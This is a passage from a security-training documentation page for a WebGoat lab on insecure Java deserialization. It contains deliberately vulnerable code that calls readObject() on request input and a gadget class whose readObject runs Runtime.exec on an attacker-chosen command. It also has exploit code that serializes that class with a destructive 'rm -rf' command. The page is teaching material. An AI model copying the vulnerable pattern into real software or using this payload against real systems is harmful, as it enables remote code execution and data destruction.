---
title: "A8:2021 | Software and Data Integrity | Insecure Deserialization (3) | Cycubix Doc"
layout: default
nav_order: 3
parent: "A8:2021 | Software and Data Integrity | Cycubix Docs"
grand_parent: "WebGoat Labs | Web Application Security Essentials | Cycubix Docs"
---
# A8:2021 | Software and Data Integrity | Insecure Deserialization (3) | Cycubix Doc

### The Simplest Exploit <a href="#the_simplest_exploit" id="the_simplest_exploit"></a>

#### Vulnerable code <a href="#vulnerable_code" id="vulnerable_code"></a>

The following is a well-known example for a Java Deserialization vulnerability.

```
InputStream is = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(is);
AcmeObject acme = (AcmeObject)ois.readObject();
```

It is expecting an `AcmeObject` object, but it will execute `readObject()` before the casting occurs. If an attacker finds the proper class implementing dangerous operations in `readObject()`, he could serialize that object and force the vulnerable application to perform those actions.

#### Class included in ClassPath <a href="#class_included_in_classpath" id="class_included_in_classpath"></a>

Attackers need to find a class in the classpath that supports serialization and with dangerous implementations on `readObject()`.

```
package org.dummy.insecure.framework;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.time.LocalDateTime;

public class VulnerableTaskHolder implements Serializable {

        private static final long serialVersionUID = 1;

        private String taskName;
        private String taskAction;
        private LocalDateTime requestedExecutionTime;

        public VulnerableTaskHolder(String taskName, String taskAction) {
                super();
                this.taskName = taskName;
                this.taskAction = taskAction;
                this.requestedExecutionTime = LocalDateTime.now();
        }

        private void readObject( ObjectInputStream stream ) throws Exception {
        //deserialize data so taskName and taskAction are available
                stream.defaultReadObject();

                //blindly run some code. #code injection
                Runtime.getRuntime().exec(taskAction);
     }
}
```

#### Exploit <a href="#exploit" id="exploit"></a>

If the java class shown above exists, attackers can serialize that object and obtain Remote Code Execution.

```
VulnerableTaskHolder go = new VulnerableTaskHolder("delete all", "rm -rf somefile");

ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(go);
oos.flush();
byte[] exploit = bos.toByteArray();
```
